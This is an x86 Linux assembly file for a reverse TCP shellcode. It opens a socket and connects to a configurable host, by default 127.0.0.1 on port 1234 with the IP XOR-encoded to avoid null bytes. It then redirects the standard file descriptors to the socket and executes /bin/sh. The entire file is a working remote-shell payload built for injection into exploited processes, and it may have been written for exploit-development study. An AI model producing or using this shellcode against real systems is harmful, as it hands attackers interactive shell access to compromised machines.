; Purpose: Reverse TCP shellcode

global _start

section .text
  ; settings
  PORT        equ 0xd204        ; default 1234
  XOR_IP      equ 0xfeffff80    ; default (127.0.0.1 XORed with 0xffffffff)
                                ; this is to avoid null in shellcode

  ; syscall kernel opcodes found in /usr/include/asm/unistd_32.h
  SOCKET      equ 0x167
  CONNECT     equ 0x16a
  DUP         equ 0x3f
  EXECVE      equ 0xb

  ; argument constants
  AF_INET     equ 0x2
  SOCK_STREAM equ 0x1

_start:
  ; clear registers
  xor ebx, ebx
  xor ecx, ecx
  mul ecx

  ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
  mov ax, SOCKET
  mov bl, AF_INET
  mov cl, SOCK_STREAM
  mov dl, 0x6
  int 0x80                      ; syscall socket(2)

  ; connect(sockfd, &sockaddr, 16)
  ; sockaddr = { AF_INET; PORT; IP_ADDR }
  xchg edi, eax                 ; edi = sockfd
  xor ecx, ecx                  ; clear ecx
  mul ecx                       ; clear eax and edx
  push ecx                      ; 0x0
  mov edx, XOR_IP               ; copy 0xfeffff80 to edx
  xor edx, 0xffffffff           ; edx xor 0xffffffff = 0x0100007f
  push edx                      ; push IP address to stack
  push word PORT                ; esp = 0xd204
  push word AF_INET             ; esp = 0xd2040002
  mov ecx, esp                  ; ecx = esp address
  push 0x10                     ; 16
  pop edx                       ; edx = 16
  mov ebx, edi                  ; ebx = sockfd
  mov ax, CONNECT               ; connect(2)
  int 0x80                      ; syscall connect(2)

  ; dup2(sockfd, fd)
  push 0x3                      ; prepare esp for ecx
  pop ecx                       ; ecx = 0x3
  mov ebx, edi                  ; ebx = sockfd
loop:
  xor eax, eax
  mov al, DUP                   ; dup(2)
  dec ecx                       ; decrement ecx to coverl all 0x2, 0x1, and 0x0 fds
  int 0x80                      ; syscall dup(2)
  jne loop                      ; loop until ecx is zero

  ; execve('/bin//sh', NULL, NULL)
  xor ebx, ebx                  ; clear ebx
  mul ebx                       ; clear eax and edx
  push ebx                      ; push NULL
  push 0x68732f2f               ; "hs//"
  push 0x6e69622f               ; "nib/"
  mov ebx, esp                  ; ebx = esp address
  mov al, EXECVE                ; execve(2)
  int 0x80                      ; syscal execve(2)
